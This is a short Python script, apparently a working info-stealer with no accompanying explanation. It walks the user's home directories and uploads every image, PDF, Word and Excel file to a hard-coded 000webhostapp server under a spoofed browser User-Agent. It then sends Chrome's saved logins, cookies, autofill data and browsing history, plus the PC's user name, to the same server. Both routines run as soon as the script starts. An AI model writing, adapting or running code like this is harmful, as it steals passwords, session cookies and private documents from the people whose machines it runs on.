import os
from time import sleep
import getpass
import requests

user = getpass.getuser()

url = "https://gfhfdfdhvhghgghhdf.000webhostapp.com/index.php"
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (K HTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'}

pat = f"/Users/{user}"
path = os.listdir(pat)
def upload(): 
    for i in path:
        try:
            path2 = os.listdir(f"{pat}/{i}")
            for q in path2:
                if q.endswith(".jpg") or q.endswith(".png") or q.endswith(".jpeg") or q.endswith(".pdf") or q.endswith(".docx") or q.endswith(".xlsx"):
                    print(f"{pat}/{i}/{q}")
                    files = {"subir_archivo": open(f"{pat}/{i}/{q}", "rb")}
                    send = requests.post(url, files=files, headers=headers)
                    sleep(0.5)
        except:
            pass

def chrome():
    getuser = getpass.getuser()
    history = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/History"
    webData = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/Web Data"
    loginData = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/Login Data"
    Cookies = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/Cookies"
    user = getpass.getuser()
    print(f"{user}")
    file = open("name.txt", "w")
    file.write("Nombre del pc: " + user)
    file.close()
    files = {"subir_archivo": open("name.txt", "rb")}
    requests.post(url, files=files, headers=headers)
    files = {"subir_archivo": open(webData, "rb")}
    requests.post(url, files=files, headers=headers)
    files = {"subir_archivo": open(loginData, "rb")}
    requests.post(url, files=files, headers=headers)
    files = {"subir_archivo": open(Cookies, "rb")}
    requests.post(url, files=files, headers=headers)
    files = {"subir_archivo": open(history, "rb")}
    requests.post(url, files=files, headers=headers)


upload()
sleep(1)
chrome()